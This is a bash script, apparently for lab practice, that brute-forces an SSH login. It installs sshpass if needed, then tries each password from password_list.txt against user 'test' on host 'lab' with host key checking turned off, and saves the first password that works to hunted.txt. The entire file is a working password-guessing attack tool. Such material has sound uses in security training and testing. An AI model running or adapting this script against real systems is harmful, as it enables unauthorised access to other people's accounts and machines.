#!/bin/bash
#

sshpass > /dev/null 2>&1
if [ $? != 0 ]; then
  echo '===> sshpass not installed! installing it now'
  sudo apt install sshpass -y
fi

export USERNAME=test
export HOST=lab

file_path="password_list.txt"

# Check if the file exists
if [ -f "$file_path" ]; then
  # Read each line of the file
  while IFS= read -r password; do
    # check if hunted.txt exists
    # which will mean password is cracked!
    if [ -f "hunted.txt" ]; then
      echo "===> PASSWORD ALREADY FOUND!"
      exit 0
    fi
    echo "===> attempting password: $password"
    sshpass -p $password ssh -p 22 -o StrictHostKeyChecking=no $USERNAME@$HOST ls > /dev/null
    if [ $? == 0 ]; then
      echo $USERNAME:$password@$HOST > hunted.txt
      echo "===> PASSWORD FOUND! CHECK hunted.txt FILE"
      exit 0
    fi
  done < "$file_path"
else
  echo "===> Passwords file not found."
fi
